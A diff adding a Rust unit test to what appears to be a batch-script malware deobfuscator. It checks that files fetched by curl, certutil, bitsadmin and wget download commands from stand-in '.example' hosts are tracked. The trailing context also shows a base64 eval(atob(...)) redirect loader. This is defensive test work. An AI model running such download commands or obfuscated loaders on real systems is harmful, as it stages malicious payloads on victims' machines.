@@ -15231,6 +15231,26 @@ echo %MARK%"#,
     }
 
     #[test]
+    fn current_dir_download_destinations_exist_for_later_if_exist() {
+        for command in [
+            r"echo marker>.\payload.txt",
+            r"curl -o .\payload.txt https://current-dir-curl.example/payload.txt",
+            r"certutil -urlcache -split -f https://current-dir-certutil.example/payload.txt .\payload.txt",
+            r"bitsadmin /transfer job https://current-dir-bits.example/payload.txt .\payload.txt",
+            r"wget -O .\payload.txt https://current-dir-wget.example/payload.txt",
+        ] {
+            let script = format!("{command}\r\nif exist payload.txt set MARK=ok\r\necho %MARK%");
+            let report = crate::analyze(script.as_bytes(), &Config::default());
+            assert!(
+                report.deobfuscated.contains("echo ok"),
+                "current-dir destination was not visible to later if exist after {command}:\n{}\ntraits={:?}",
+                report.deobfuscated,
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn move_to_tracked_directory_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS10cmFja2VkLWRpci5leGFtcGxlL3BheWxvYWQn")) > original.js
